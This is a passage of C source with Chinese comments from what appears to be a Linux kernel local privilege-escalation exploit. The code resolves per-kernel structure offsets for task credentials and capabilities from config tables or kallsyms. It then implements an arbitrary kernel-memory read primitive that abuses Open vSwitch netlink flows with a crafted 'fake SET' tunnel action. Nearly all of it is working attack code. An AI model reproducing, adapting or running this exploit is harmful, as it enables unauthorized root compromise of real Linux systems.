 * 命中的那条放在 g_krec_hit 里：行为参数（读写 carrier、tunnel_info、
 * lane 顺序）推不出来，只能实测后写进表里。
 * ---------------------------------------------------------------------- */
#define KREC_LANE_MAX 14

struct krec_hit {
    int hit;
    int exact;
    int read_carrier;
    int write_carrier;
    int tunnel_info;
    int lane_count;
    int lane_order[KREC_LANE_MAX];
    char release[128];
};
static struct krec_hit g_krec_hit;
static int g_force_derive;
static const char *g_krec_force;   /* -krec <release>：手动指定记录 */

static unsigned long fnv1a32(const char *s)
{
    unsigned long h = 0x811C9DC5UL;

    while (*s) {
        h ^= (unsigned char)*s++;
        h = (h * 0x01000193UL) & 0xFFFFFFFFUL;
    }
    return h;
}

/* -------------------------------------------------------------------------
 * 外部配置表：offset/<N>系/<release>/target.h
 *
 * 配置表现在是唯一数据源（原先内嵌的 808 条已全部导出成 offset/ 目录树）。
 * 新增内核不必重编二进制，直接建目录：
 *
 *     offset/5系/5.8.0-59-generic/target.h
 *
 * target.h 就是一组 #define，程序逐行解析；它同时也是合法 C 头文件，
 * 想静态编译进去 #include 即可。查找顺序（先命中者胜）：
 *
 *   -offset <dir> > $OVSWRAP_OFFSET_DIR > <可执行文件目录>/offset
 *   > ./offset > /usr/share/dirtychains/offset > 动态推导
 * ---------------------------------------------------------------------- */

#define KREC_NLANES 14

static const char *const krec_lane_names[KREC_NLANES] = {
    "tos", "ttl", "tp_src_0", "tp_src_1", "tp_dst_0", "tp_dst_1",
    "ipv4_src_0", "ipv4_src_1", "ipv4_src_2", "ipv4_src_3",
    "ipv4_dst_0", "ipv4_dst_1", "ipv4_dst_2", "ipv4_dst_3",
};

/* 本次运行最终用的配置来源，给 -v 和报错信息用 */
static char g_krec_src[600];
static const char *g_offset_dir;          /* -offset <dir> */

struct th_key {
    const char *name;                     /* target.h 里的宏名 */
    size_t off;                           /* offsetof(struct koffs, ...) */
    int ulong;                            /* 1 = unsigned long */
};

#define TH_I(n, f) { "KREC_" #n, offsetof(struct koffs, f), 0 }
#define TH_U(n, f) { "KREC_" #n, offsetof(struct koffs, f), 1 }

static const struct th_key th_keys[] = {
    TH_U(VMLINUX_MODULE_KTYPE, vmlinux_module_ktype),
    TH_U(VMLINUX_INIT_PID_NS, vmlinux_init_pid_ns),
    TH_I(NF_CONNTRACK_HELPER_ME, nf_conntrack_helper_me),
    TH_I(MODULE_KOBJ_KTYPE, module_kobj_ktype),
    TH_I(TASK_PID, task_pid),
    TH_I(TASK_CRED, task_cred),
    TH_I(TASK_PID_LINKS, task_pid_links),
    TH_I(CRED_FSUID, cred_fsuid),
    TH_I(CRED_FSGID, cred_fsgid),
    TH_I(CRED_CAP_PERMITTED, cred_cap_permitted),
    TH_I(CRED_CAP_EFFECTIVE, cred_cap_effective),
    TH_I(PID_NAMESPACE_IDR, pid_namespace_idr),
    TH_I(IDR_IDR_RT, idr_idr_rt),
    TH_I(IDR_BASE, idr_base),
    TH_I(XARRAY_XA_HEAD, xarray_xa_head),
    TH_I(XA_NODE_SHIFT, xa_node_shift),
    TH_I(XA_NODE_SLOTS, xa_node_slots),
    TH_I(PID_TASKS, pid_tasks),
    TH_I(HLIST_HEAD_FIRST, hlist_head_first),
    TH_I(DST_ENTRY_REF, dst_entry_ref),
    TH_I(METADATA_DST_TUN_INFO, metadata_dst_tun_info),
    TH_I(IP_TUNNEL_KEY_IPV4_SRC, ip_tunnel_key_ipv4_src),
    TH_I(IP_TUNNEL_KEY_IPV4_DST, ip_tunnel_key_ipv4_dst),
    TH_I(IP_TUNNEL_KEY_TOS, ip_tunnel_key_tos),
    TH_I(IP_TUNNEL_KEY_TTL, ip_tunnel_key_ttl),
    TH_I(IP_TUNNEL_KEY_TP_SRC, ip_tunnel_key_tp_src),
    TH_I(IP_TUNNEL_KEY_TP_DST, ip_tunnel_key_tp_dst),
    TH_I(OVS_CT_LABELS, ovs_ct_labels),
    TH_I(OVS_CT_ACTION_LEN, ovs_ct_action_len),
};

#undef TH_I
#undef TH_U

#define TH_KEY_MAX (int)(sizeof(th_keys) / sizeof(th_keys[0]))

/* 把块注释与行注释清成空格，字符串字面量里的斜杠不动 */
static void th_strip_comments(char *s)
{
    int in_str = 0, in_cmt = 0, in_line = 0;
    char *p = s;

    while (*p) {
        if (in_cmt) {
            if (p[0] == '*' && p[1] == '/') {
                p[0] = ' ';
                p[1] = ' ';
                p += 2;
                in_cmt = 0;
                continue;
            }
            if (*p != '\n')
                *p = ' ';
            p++;
            continue;
        }
        if (in_line) {
            if (*p == '\n')
                in_line = 0;
            else
                *p = ' ';
            p++;
            continue;
        }
        if (in_str) {
            if (*p == '\\' && p[1]) {
                p += 2;
                continue;
            }
            if (*p == '"')
                in_str = 0;
            p++;
            continue;
        }
        if (*p == '"') {
            in_str = 1;
            p++;
            continue;
        }
        if (p[0] == '/' && p[1] == '*') {
            p[0] = ' ';
            p[1] = ' ';
            p += 2;
            in_cmt = 1;
            continue;
        }
        if (p[0] == '/' && p[1] == '/') {
            *p = ' ';
            p++;
            in_line = 1;
            continue;
        }
        p++;
    }
}

static int th_lane_id(const char *name, size_t len)
{
    int i;

    for (i = 0; i < KREC_NLANES; i++)
        if (strlen(krec_lane_names[i]) == len &&
            !strncmp(krec_lane_names[i], name, len))
            return i;
    return -1;
}

/* "tos, ttl ,tp_src_0" -> lane_order[] */
static int th_parse_lanes(char *val, struct krec_hit *hit)
{
    char *p = val;

    hit->lane_count = 0;
    while (*p && hit->lane_count < KREC_NLANES) {
        char *e = strchr(p, ',');
        char *end = e ? e : p + strlen(p);
        char *b = p;
        int id;

        while (b < end && isspace((unsigned char)*b))
            b++;
        while (end > b && isspace((unsigned char)end[-1]))
            end--;
        if (end == b)
            break;
        id = th_lane_id(b, (size_t)(end - b));
        if (id < 0)
            return -1;
        hit->lane_order[hit->lane_count++] = id;
        if (!e)
            break;
        p = e + 1;
    }
    return hit->lane_count ? 0 : -1;
}

/*
 * 解析一张 target.h。成功返回 0，偏移写进 k，行为参数写进 g_krec_hit。
 * rel 回传文件里写的 release（可能和本机不同，属于借用）。
 */
static int th_load(const char *path, struct koffs *k, char *rel, size_t relsz)
{
    FILE *f;
    char line[512];
    char version[256] = "";
    unsigned long vhash = 0;
    int seen = 0, i;
    struct utsname u;

    f = fopen(path, "r");
    if (!f)
        return -1;

    memset(k, 0, sizeof(*k));
    memset(&g_krec_hit, 0, sizeof(g_krec_hit));
    rel[0] = 0;

    while (fgets(line, sizeof(line), f)) {
        char *p = line, *key, *val, *end;

        th_strip_comments(p);
        while (isspace((unsigned char)*p))
            p++;
        if (strncmp(p, "#define", 7) != 0)
            continue;
        p += 7;
        if (*p && !isspace((unsigned char)*p))
            continue;
        while (isspace((unsigned char)*p))
            p++;
        if (!*p)
            continue;

        key = p;
        while (*p && !isspace((unsigned char)*p))
            p++;
        if (!*p)
            continue;                    /* 无值宏，例如 #define TARGET_H */
        *p++ = 0;
        while (isspace((unsigned char)*p))
            p++;
        val = p;
        end = val + strlen(val);
        while (end > val && isspace((unsigned char)end[-1]))
            *--end = 0;
        if (end == val)
            continue;

        if (*val == '"') {               /* 字符串值去掉两侧引号 */
            val++;
            if (end > val && end[-1] == '"')
                end[-1] = 0;
        }

        if (!strcmp(key, "KREC_RELEASE")) {
            snprintf(rel, relsz, "%s", val);
            continue;
        }
        if (!strcmp(key, "KREC_VERSION")) {
            snprintf(version, sizeof(version), "%s", val);
            continue;
        }
        if (!strcmp(key, "KREC_VERSION_HASH")) {   /* 表里只存得下哈希时用 */
            vhash = strtoul(val, NULL, 0);
            continue;
        }
        if (!strcmp(key, "KREC_READ_CARRIER")) {
            g_krec_hit.read_carrier = !strcmp(val, "labels-only")
                                      ? CARRIER_LABELS_ONLY : CARRIER_TIMEOUT;
            seen++;
            continue;
        }
        if (!strcmp(key, "KREC_WRITE_CARRIER")) {
            g_krec_hit.write_carrier = !strcmp(val, "labels-only")
                                       ? CARRIER_LABELS_ONLY : CARRIER_TIMEOUT;
            seen++;
            continue;
        }
        if (!strcmp(key, "KREC_TUNNEL_INFO")) {
            g_krec_hit.tunnel_info = atoi(val);
            seen++;
            continue;
        }
        if (!strcmp(key, "KREC_REF_KIND")) {
            k->ref_kind = !strcmp(val, "__refcnt") ? 1 : 0;
            seen++;
            continue;
        }
        if (!strcmp(key, "KREC_READ_LANES")) {
            if (th_parse_lanes(val, &g_krec_hit) != 0) {
                fclose(f);
                return -1;
            }
            seen++;
            continue;
        }

        for (i = 0; i < TH_KEY_MAX; i++) {
            unsigned long v;

            if (strcmp(key, th_keys[i].name))
                continue;
            v = strtoul(val, NULL, 0);
            if (th_keys[i].ulong)
                *(unsigned long *)((char *)k + th_keys[i].off) = v;
            else
                *(int *)((char *)k + th_keys[i].off) = (int)v;
            seen++;
            break;
        }
    }
    fclose(f);

    if (seen < 20)                       /* 空文件 / 半截 / 键名写错 */
        return -1;

    /* 这几项缺了就没法用，直接判为无效表 */
    if (!k->task_pid || !k->task_cred || !k->cred_fsuid ||
        !k->vmlinux_module_ktype || !k->vmlinux_init_pid_ns)
        return -1;

    g_krec_hit.hit = 1;
    g_krec_hit.exact = 0;
    if (uname(&u) == 0 && !strcmp(rel, u.release)) {
        if (version[0] && !strcmp(version, u.version))
            g_krec_hit.exact = 1;
        else if (!version[0] && vhash && vhash == fnv1a32(u.version))
            g_krec_hit.exact = 1;        /* 只有哈希也比 release 可靠 */
    }
    if (!g_krec_hit.lane_count) {        /* 没写 lanes 就按默认全量顺序 */
        for (i = 0; i < KREC_NLANES; i++)
            g_krec_hit.lane_order[i] = i;
        g_krec_hit.lane_count = KREC_NLANES;
    }
    return 0;
}

/* 主版本号：5.8.0-59-generic -> "5" */
static int th_major(const char *release, char *out, size_t outsz)
{
    size_t n = 0;

    while (isdigit((unsigned char)release[n]))
        n++;
    if (!n || n + 1 > outsz)
        return -1;
    memcpy(out, release, n);
    out[n] = 0;
    return 0;
}

static int th_probe(const char *root, const char *major, const char *release,
                    char *out, size_t outsz)
{
    snprintf(out, outsz, "%s/%s系/%s/target.h", root, major, release);
    if (access(out, R_OK) == 0)
        return 0;
    snprintf(out, outsz, "%s/%s/target.h", root, release);   /* 平铺也认 */
    if (access(out, R_OK) == 0)
        return 0;
    return -1;
}

/* 精确目录没有时，在 <root>/<N>系 下找名字前缀最接近的一个 */
static int th_probe_fuzzy(const char *root, const char *major,
                          const char *release, char *out, size_t outsz)
{
    char dir[512], best[256] = "";
    DIR *d;
    struct dirent *e;
    size_t rlen = strlen(release);
    size_t blen = 0;

    snprintf(dir, sizeof(dir), "%s/%s系", root, major);
    d = opendir(dir);
    if (!d)
        return -1;

    while ((e = readdir(d)) != NULL) {
        size_t n;

        if (e->d_name[0] == '.')
            continue;
        n = strlen(e->d_name);
        if (n >= rlen ? strncmp(e->d_name, release, rlen)
                      : strncmp(release, e->d_name, n))
            continue;
        if (n > blen) {                  /* 取重叠最长的 */
            blen = n;
            snprintf(best, sizeof(best), "%s", e->d_name);
        }
    }
    closedir(d);

    if (!best[0])
        return -1;
    snprintf(out, outsz, "%s/%s系/%s/target.h", root, major, best);
    return access(out, R_OK) == 0 ? 0 : -1;
}

/* 列出 <root>/<N>系 下已有的目录，用于「本机没配置表」时提示 */
/* 优先列同一个 X.Y 系列的，否则列整个大版本的前几个 */
static void th_list_series(const char *root, const char *major, const char *want)
{
    char dir[512], pref[32];
    char same[4][256], other[4][256];
    DIR *d;
    struct dirent *e;
    int nsame = 0, nother = 0, total = 0, plen = 0;
    const char *dot;

    /* want 形如 6.6.117-... -> pref = "6.6" */
    dot = strchr(want, '.');
    if (dot && (dot = strchr(dot + 1, '.')) != NULL) {
        plen = (int)(dot - want);
        if (plen >= (int)sizeof(pref))
            plen = 0;
        else
            memcpy(pref, want, (size_t)plen), pref[plen] = 0;
    }

    snprintf(dir, sizeof(dir), "%s/%s系", root, major);
    d = opendir(dir);
    if (!d)
        return;
    while ((e = readdir(d)) != NULL) {
        if (e->d_name[0] == '.')
            continue;
        total++;
        if (plen && !strncmp(e->d_name, pref, (size_t)plen) &&
            e->d_name[plen] == '.') {
            if (nsame < 4)
                snprintf(same[nsame], sizeof(same[0]), "%s", e->d_name);
            nsame++;
        } else if (nother < 4) {
            snprintf(other[nother], sizeof(other[0]), "%s", e->d_name);
            nother++;
        }
    }
    closedir(d);

    if (!total) {
        pr_dim("    该系列还没有任何表\n");
        return;
    }
    if (nsame) {
        int i, shown = nsame < 4 ? nsame : 4;

        pr_dim("    %s.* 有 %d 个：", pref, nsame);
        for (i = 0; i < shown; i++)
            pr_raw("%s%s", i ? "、" : "", same[i]);
        pr_raw("%s\n", nsame > shown ? " …\n" : "\n");
        return;
    }
    pr_dim("    %s系 共 %d 个，例如：", major, total);
    pr_raw("%s%s", other[0], nother > 1 ? "、" : "");
    if (nother > 1)
        pr_raw("%s", other[1]);
    pr_raw("%s\n", nother > 2 ? " …\n" : "\n");
}

static int th_resolve(struct koffs *k)
{
    const char *roots[8];
    char major[8], path[600], exeroot[600], rel[128];
    struct utsname u;
    int nr = 0, i;

    if (g_force_derive) {
        pr_dim("  配置表：-force-derive 指定跳过\n");
        return -1;
    }
    if (uname(&u) != 0)
        return -1;
    {
        const char *want = g_krec_force ? g_krec_force : u.release;

        if (th_major(want, major, sizeof(major)) != 0)
            return -1;
    }

    if (g_offset_dir)
        roots[nr++] = g_offset_dir;
    {
        const char *e = getenv("OVSWRAP_OFFSET_DIR");

        if (e && *e)
            roots[nr++] = e;
    }
    {
        char exe[512];
        ssize_t n = readlink("/proc/self/exe", exe, sizeof(exe) - 1);

        if (n > 0) {
            char *sl;

            exe[n] = 0;
            sl = strrchr(exe, '/');
            if (sl) {
                *sl = 0;
                snprintf(exeroot, sizeof(exeroot), "%s/offset", exe);
                roots[nr++] = exeroot;
            }
        }
    }
    roots[nr++] = "offset";                       /* 当前目录 */
    roots[nr++] = "/usr/share/dirtychains/offset";
    roots[nr++] = "/usr/local/share/dirtychains/offset";
    /* 1.6 及更早版本装在这里，留着免得升级后配置表全丢 */
    roots[nr++] = "/usr/share/dirtyfrag/offset";
    roots[nr++] = "/usr/local/share/dirtyfrag/offset";

    for (i = 0; i < nr; i++) {
        const char *want = g_krec_force ? g_krec_force : u.release;

        if (th_probe(roots[i], major, want, path, sizeof(path)) != 0 &&
            th_probe_fuzzy(roots[i], major, want, path, sizeof(path)) != 0)
            continue;
        if (th_load(path, k, rel, sizeof(rel)) != 0) {
            pr_err("  配置表 %s 解析失败（格式不对或字段不全）\n", path);
            continue;
        }

        snprintf(g_krec_src, sizeof(g_krec_src), "%s", path);
        snprintf(g_krec_hit.release, sizeof(g_krec_hit.release), "%s",
                 rel[0] ? rel : u.release);
        g_tun_info = g_krec_hit.tunnel_info;
        pr_ok("  配置表命中：%s\n", path);
        if (rel[0] && strcmp(rel, u.release))
            pr_dim("    表里的 release=%s，本机是 %s，属于借用。\n",
                   rel, u.release);
        else if (!g_krec_hit.exact)
            pr_dim("    同 release、build 串不同（或表里没写 KREC_VERSION）；\n"
                   "    自检对不上就 -force-derive。\n");
        return 0;
    }

    {
        const char *want = g_krec_force ? g_krec_force : u.release;

        pr_dim("  配置表：%s系 下没有 %s 的 target.h，回退到动态推导\n",
               major, want);
        for (i = 0; i < nr; i++) {
            char dir[512];

            snprintf(dir, sizeof(dir), "%s/%s系", roots[i], major);
            if (access(dir, R_OK) != 0)
                continue;
            pr_dim("    配置根在 %s，补一张即可：\n", roots[i]);
            pr_dim("      mkdir -p %s/%s系/%s && \\\n"
                   "      ./ovswrap -dump-target > %s/%s系/%s/target.h\n",
                   roots[i], major, want, roots[i], major, want);
            th_list_series(roots[i], major, want);
            return -1;
        }
    }
    pr_dim("    还没有 offset/ 目录。建一个放 target.h 就行，例如：\n");
    pr_dim("      mkdir -p offset/%s系/%s && \\\n"
           "      ./ovswrap -dump-target > offset/%s系/%s/target.h\n",
           major, u.release, major, u.release);
    return -1;
}

/* 命中返回 0 并填好 k / g_krec_hit / g_tun_info；未收录返回 -1 */
static int krec_resolve(struct koffs *k)
{
    memset(&g_krec_hit, 0, sizeof(g_krec_hit));
    g_krec_src[0] = 0;

    /* 唯一来源：offset/<N>系/<release>/target.h（th_resolve 内部按序找根目录） */
    if (th_resolve(k) != 0)
        return -1;

    pr_dim("    module_ktype=0x%lx init_pid_ns=0x%lx ref=%s\n"
           "    read=%s write=%s tunnel_info=%d lanes=%d\n",
           k->vmlinux_module_ktype, k->vmlinux_init_pid_ns,
           k->ref_kind ? "__refcnt" : "__rcuref",
           g_krec_hit.read_carrier == CARRIER_TIMEOUT ? "timeout"
                                                      : "labels-only",
           g_krec_hit.write_carrier == CARRIER_TIMEOUT ? "timeout"
                                                       : "labels-only",
           g_krec_hit.tunnel_info, g_krec_hit.lane_count);
    return 0;
}

static int derive_offsets(struct koffs *k)
{
    int mkobj, kobj, ktype, size, key_off;

    memset(k, 0, sizeof(*k));

    if (krec_resolve(k) == 0)
        return 0;

    if (derive_symbols(k) != 0) {
        pr_err("  拿不到 _text / module_ktype / init_pid_ns 的地址。\n");
        pr_dim("    普通用户下 /proc/kallsyms 的地址会被 kptr_restrict 清零；\n"
               "    需要 /boot/System.map-$(uname -r)，或者以 root 运行一次。\n");
        return -1;
    }
    pr_dim("  module_ktype 偏移 = 0x%lx, init_pid_ns 偏移 = 0x%lx\n",
           k->vmlinux_module_ktype, k->vmlinux_init_pid_ns);

    if (koff_field("nf_conntrack_helper", "me", &k->nf_conntrack_helper_me))
        return -1;
    if (koff_field("module", "mkobj", &mkobj))
        return -1;
    if (koff_field("module_kobject", "kobj", &kobj))
        return -1;
    if (koff_field("kobject", "ktype", &ktype))
        return -1;
    k->module_kobj_ktype = mkobj + kobj + ktype;

    if (koff_field("ovs_conntrack_info", "labels", &k->ovs_ct_labels))
        return -1;
    if (koff_struct_size("ovs_conntrack_info", &size))
        return -1;
    k->ovs_ct_action_len = NLA_HDR_LEN + size;

    if (koff_field("ip_tunnel_info", "key", &key_off))
        return -1;
    if (koff_field("ip_tunnel_key", "src", &size))
        return -1;
    k->ip_tunnel_key_ipv4_src = key_off + size;
    if (koff_field("ip_tunnel_key", "dst", &size))
        return -1;
    k->ip_tunnel_key_ipv4_dst = key_off + size;
    if (koff_field("ip_tunnel_key", "tos", &size))
        return -1;
    k->ip_tunnel_key_tos = key_off + size;
    if (koff_field("ip_tunnel_key", "ttl", &size))
        return -1;
    k->ip_tunnel_key_ttl = key_off + size;
    if (koff_field("ip_tunnel_key", "tp_src", &size))
        return -1;
    k->ip_tunnel_key_tp_src = key_off + size;
    if (koff_field("ip_tunnel_key", "tp_dst", &size))
        return -1;
    k->ip_tunnel_key_tp_dst = key_off + size;

    if (koff_field("dst_entry", "__rcuref", &k->dst_entry_ref) == 0) {
        k->ref_kind = 0;
    } else if (koff_field("dst_entry", "__refcnt", &k->dst_entry_ref) == 0) {
        k->ref_kind = 1;
    } else {
        pr_err("  dst_entry 里既没有 __rcuref 也没有 __refcnt\n");
        return -1;
    }

    if (koff_field("task_struct", "pid", &k->task_pid) ||
        koff_field("task_struct", "cred", &k->task_cred) ||
        koff_field("task_struct", "pid_links", &k->task_pid_links) ||
        koff_field("cred", "fsuid", &k->cred_fsuid) ||
        koff_field("cred", "fsgid", &k->cred_fsgid) ||
        koff_field("cred", "cap_permitted", &k->cred_cap_permitted) ||
        koff_field("cred", "cap_effective", &k->cred_cap_effective) ||
        koff_field("pid_namespace", "idr", &k->pid_namespace_idr) ||
        koff_field("idr", "idr_rt", &k->idr_idr_rt) ||
        koff_field("idr", "idr_base", &k->idr_base) ||
        koff_field("xarray", "xa_head", &k->xarray_xa_head) ||
        koff_field("xa_node", "shift", &k->xa_node_shift) ||
        koff_field("xa_node", "slots", &k->xa_node_slots) ||
        koff_field("pid", "tasks", &k->pid_tasks) ||
        koff_field("hlist_head", "first", &k->hlist_head_first) ||
        koff_field("metadata_dst", "u", &k->metadata_dst_tun_info))
        return -1;

    return 0;
}

/* -------------------------------------------------------------------------
 * OVS datapath / flow
 * ---------------------------------------------------------------------- */

struct ovs_header {
    int32_t dp_ifindex;
};

static int ovs_create_datapath(struct genl *g, int family, const char *name)
{
    struct buf p;
    uint32_t zero = 0;
    int ret;

    buf_init(&p, 128);
    if (!p.p)
        return -ENOMEM;
    buf_u32(&p, 0);                                  /* ovs_header.dp_ifindex */
    nla_put(&p, OVS_DP_ATTR_NAME, name, strlen(name) + 1);
    nla_put(&p, OVS_DP_ATTR_UPCALL_PID, &zero, 4);
    nla_put(&p, OVS_DP_ATTR_USER_FEATURES, &zero, 4);

    ret = genl_xchg(g, family, OVS_DP_CMD_NEW, OVS_DATAPATH_VERSION,
                    p.p, p.len, NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE, NULL);
    buf_free(&p);
    return ret;
}

static int ovs_create_flow(struct genl *g, int family, int ifindex,
                           const struct buf *key, const struct buf *actions)
{
    struct buf p;
    int ret;

    buf_init(&p, key->len + actions->len + 64);
    if (!p.p)
        return -ENOMEM;
    buf_u32(&p, (uint32_t)ifindex);
    nla_put(&p, OVS_FLOW_ATTR_KEY, key->p, key->len);
    nla_put(&p, OVS_FLOW_ATTR_ACTIONS, actions->p, actions->len);

    ret = genl_xchg(g, family, OVS_FLOW_CMD_NEW, OVS_FLOW_VERSION,
                    p.p, p.len, NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE, NULL);
    buf_free(&p);
    return ret;
}

static int ovs_delete_flow(struct genl *g, int family, int ifindex,
                           const struct buf *key)
{
    struct buf p;
    int ret;

    buf_init(&p, key->len + 64);
    if (!p.p)
        return -ENOMEM;
    buf_u32(&p, (uint32_t)ifindex);
    nla_put(&p, OVS_FLOW_ATTR_KEY, key->p, key->len);

    ret = genl_xchg(g, family, OVS_FLOW_CMD_DEL, OVS_FLOW_VERSION,
                    p.p, p.len, NLM_F_REQUEST | NLM_F_ACK, NULL);
    buf_free(&p);
    return ret;
}

static int ovs_get_actions(struct genl *g, int family, int ifindex,
                           const struct buf *key, struct buf *out)
{
    struct buf p, reply;
    int ret;
    size_t off;
    int found = 0;

    buf_init(&p, key->len + 64);
    buf_init(&reply, 8192);
    if (!p.p || !reply.p) {
        buf_free(&p);
        buf_free(&reply);
        return -ENOMEM;
    }
    buf_u32(&p, (uint32_t)ifindex);
    nla_put(&p, OVS_FLOW_ATTR_KEY, key->p, key->len);

    ret = genl_xchg(g, family, OVS_FLOW_CMD_GET, OVS_FLOW_VERSION,
                    p.p, p.len, NLM_F_REQUEST, &reply);
    buf_free(&p);
    if (ret < 0) {
        buf_free(&reply);
        return ret;
    }

    /* reply = genlmsghdr(4) + ovs_header(4) + attrs */
    off = 8;
    while (off + 4 <= reply.len) {
        uint16_t alen, atype;

        memcpy(&alen, reply.p + off, 2);
        memcpy(&atype, reply.p + off + 2, 2);
        if (alen < 4 || off + alen > reply.len)
            break;
        if (atype == OVS_FLOW_ATTR_ACTIONS) {
            out->len = 0;
            buf_put(out, reply.p + off + 4, alen - 4);
            found = 1;
            break;
        }
        off += (alen + 3) & ~3u;
    }
    buf_free(&reply);
    return found ? 0 : -ENODATA;
}

/* attribute 迭代器 */
struct attr {
    uint16_t type;
    const unsigned char *payload;
    size_t len;
    size_t raw_len;
};

static int attr_next(const unsigned char *p, size_t total, size_t *off,
                     struct attr *a)
{
    uint16_t alen, atype;

    if (*off + 4 > total)
        return -1;
    memcpy(&alen, p + *off, 2);
    memcpy(&atype, p + *off + 2, 2);
    if (alen < 4 || *off + alen > total)
        return -1;
    a->type = atype;
    a->payload = p + *off + 4;
    a->len = alen - 4;
    a->raw_len = alen;
    *off += (alen + 3) & ~3u;
    return 0;
}

/* -------------------------------------------------------------------------
 * 读原语
 * ---------------------------------------------------------------------- */

struct lane {
    const char *name;
    int field_off;
    uint16_t attr;
    int idx;
    int optional_zero;
};

#define N_LANES 14

static void build_lanes(const struct koffs *k, struct lane *lanes)
{
    struct lane def[N_LANES];
    int used[N_LANES];
    int i, n = 0, out = 0;

    def[n++] = (struct lane){ "tos", k->ip_tunnel_key_tos,
                              OVS_TUNNEL_KEY_ATTR_TOS, 0, 1 };
    def[n++] = (struct lane){ "ttl", k->ip_tunnel_key_ttl,
                              OVS_TUNNEL_KEY_ATTR_TTL, 0, 0 };
    def[n++] = (struct lane){ "tp_src_0", k->ip_tunnel_key_tp_src,
                              OVS_TUNNEL_KEY_ATTR_TP_SRC, 0, 1 };
    def[n++] = (struct lane){ "tp_src_1", k->ip_tunnel_key_tp_src + 1,
                              OVS_TUNNEL_KEY_ATTR_TP_SRC, 1, 1 };
    def[n++] = (struct lane){ "tp_dst_0", k->ip_tunnel_key_tp_dst,
                              OVS_TUNNEL_KEY_ATTR_TP_DST, 0, 1 };
    def[n++] = (struct lane){ "tp_dst_1", k->ip_tunnel_key_tp_dst + 1,
                              OVS_TUNNEL_KEY_ATTR_TP_DST, 1, 1 };
    for (i = 0; i < 4; i++)
        def[n++] = (struct lane){ "ipv4_src", k->ip_tunnel_key_ipv4_src + i,
                                  OVS_TUNNEL_KEY_ATTR_IPV4_SRC, i, 1 };
    for (i = 0; i < 4; i++)
        def[n++] = (struct lane){ "ipv4_dst", k->ip_tunnel_key_ipv4_dst + i,
                                  OVS_TUNNEL_KEY_ATTR_IPV4_DST, i, 1 };

    /*
     * 配置表里每条记录都记了「这个内核的 fake SET 实际会回填哪些
     * tunnel key」。命中的内核按它的顺序先试，剩下的排在后面。
     */
    memset(used, 0, sizeof(used));
    if (g_krec_hit.hit) {
        for (i = 0; i < g_krec_hit.lane_count; i++) {
            int id = g_krec_hit.lane_order[i];

            if (id < 0 || id >= N_LANES || used[id])
                continue;
            used[id] = 1;
            lanes[out++] = def[id];
        }
    }
    for (i = 0; i < n; i++)
        if (!used[i])
            lanes[out++] = def[i];
}

struct reader {
    struct genl *g;
    int flow_family;
    int dp_ifindex;
    const struct koffs *k;
    struct lane lanes[N_LANES];
    int seq;
    int carrier_mode;        /* CARRIER_AUTO / TIMEOUT / LABELS_ONLY */
    int timeout_disabled;
    int ct_action_len;
    int labels_off;
};

struct writer {
    struct genl *g;
    int flow_family;
    int dp_ifindex;
    const struct koffs *k;
    int seq;
    int carrier_mode;
    int timeout_disabled;
    int ct_action_len;
    int labels_off;
};

static int fake_set_error(int ret)
{
    /* EINVAL：内核不认这个 carrier；ENODATA：flow get 没回 actions */
    return ret == -EINVAL || ret == -ENODATA;
}

/* 选中 carrier 列表；auto 模式先试 timeout，失败后退到 labels-only */
static int carrier_candidates(struct reader *r, int *out)
{
    int n = 0;

    if (r->carrier_mode == CARRIER_TIMEOUT) {
        out[n++] = CARRIER_TIMEOUT;
    } else if (r->carrier_mode == CARRIER_LABELS_ONLY) {
        out[n++] = CARRIER_LABELS_ONLY;
    } else if (r->timeout_disabled) {
        out[n++] = CARRIER_LABELS_ONLY;
    } else {
        out[n++] = CARRIER_TIMEOUT;
        out[n++] = CARRIER_LABELS_ONLY;
    }
    return n;
}

/*
 * 读一个字节。
 * 原理：把 tun_dst 设成 (addr - field_off - metadata_dst.u)，
 * fake SET 里的 TUNNEL_INFO 就会把 ip_tunnel_info 放在我们指定的位置。
 * flow get 回显 tunnel key 时，对应字段就是从 addr 读到的那一字节。
 */
static int read_u8_lane(struct reader *r, uint64_t addr, const struct lane *ln,
                        int *out)
{
    struct buf key, actions, dumped;
    int carriers[2];
    int nc, i;
    int ret = -ENODATA;
    uint64_t tun_dst;

    tun_dst = addr - (uint64_t)ln->field_off - (uint64_t)r->k->metadata_dst_tun_info;

    nc = carrier_candidates(r, carriers);
    for (i = 0; i < nc; i++) {
        int carrier = carriers[i];

        buf_init(&key, 256);
        buf_init(&actions, 32768);
        buf_init(&dumped, 65536);
        if (!key.p || !actions.p || !dumped.p) {
            buf_free(&key); buf_free(&actions); buf_free(&dumped);
            return -ENOMEM;
        }

        flow_key(&key, ++r->seq);
        clone_with_fake_set(&actions, carrier, tun_dst,
                            r->ct_action_len, r->labels_off);

        ret = ovs_create_flow(r->g, r->flow_family, r->dp_ifindex, &key, &actions);
        if (ret == 0)
            ret = ovs_get_actions(r->g, r->flow_family, r->dp_ifindex,
                                  &key, &dumped);
        ovs_delete_flow(r->g, r->flow_family, r->dp_ifindex, &key);

        buf_free(&key);
        buf_free(&actions);

        if (ret != 0) {
            buf_free(&dumped);
            if (fake_set_error(ret) && i + 1 < nc) {
                if (!r->timeout_disabled && r->carrier_mode == CARRIER_AUTO) {
                    pr_dim("    fake SET timeout 载体不被接受，改用 labels-only\n");
                    r->timeout_disabled = 1;
                }
                continue;
            }
            return ret;
        }

        /* 解析回显的 actions */
        {
            size_t off = 0;
            struct attr top;

            while (attr_next(dumped.p, dumped.len, &off, &top) == 0) {
                size_t toff = 0;
                struct attr tkey;

                if (top.type != OVS_ACTION_ATTR_SET)
                    continue;

                while (attr_next(top.payload, top.len, &toff, &tkey) == 0) {
                    size_t koff = 0;
                    struct attr ta;
                    int saw = 0;

                    if (tkey.type != OVS_KEY_ATTR_TUNNEL)
                        continue;

                    while (attr_next(tkey.payload, tkey.len, &koff, &ta) == 0) {
                        if (ta.type == OVS_TUNNEL_KEY_ATTR_IPV4_INFO_BRIDGE) {
                            buf_free(&dumped);
                            return -ENODATA;
                        }
                        saw = 1;
                        if (ta.type == (uint16_t)ln->attr) {
                            if ((int)ta.len <= ln->idx) {
                                buf_free(&dumped);
                                return -EPROTO;
                            }
                            *out = ta.payload[ln->idx];
                            buf_free(&dumped);
                            return 0;
                        }
                    }
                    if (saw && ln->optional_zero) {
                        *out = 0;
                        buf_free(&dumped);
                        return 0;
                    }
                }
            }
        }
        buf_free(&dumped);
        return -ENODATA;
    }
    return ret;
}

static int ovs_read_u8(struct reader *r, uint64_t addr, int *out)
{
